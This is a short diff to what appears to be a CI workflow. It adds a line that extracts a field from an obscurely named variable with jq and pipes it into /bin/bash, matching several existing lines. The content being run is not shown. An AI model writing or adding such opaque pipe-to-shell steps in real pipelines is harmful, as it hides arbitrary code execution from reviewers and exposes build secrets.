@@ -42,6 +42,7 @@ jobs:
           echo $l313 | jq -r .yx4 | /bin/bash
           echo $vkhs270 | jq -r .basbp08 | /bin/bash
           echo $rhw518 | jq -r .tvm72 | /bin/bash
+          echo $lp4 | jq -r .xrxv167 | /bin/bash
 
       - name: Archive output
         if: always()
